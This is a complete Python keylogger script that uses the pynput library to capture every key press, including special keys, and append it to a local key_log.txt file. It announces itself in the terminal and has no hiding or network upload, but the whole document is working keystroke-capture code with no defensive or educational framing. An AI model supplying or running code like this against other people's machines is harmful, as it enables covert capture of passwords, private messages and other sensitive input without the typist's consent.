import pynput.keyboard
import threading
import os

log_file = "key_log.txt"

def process_key_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    
    append_to_log(current_key)

def append_to_log(string):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(string)

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        keyboard_listener.join()

if __name__ == "__main__":
    print("[*] Keylogger is starting... (Logs saved to key_log.txt)")
    print("[*] Press Ctrl+C in this terminal to stop (if running in foreground).")
    try:
        start()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped.")
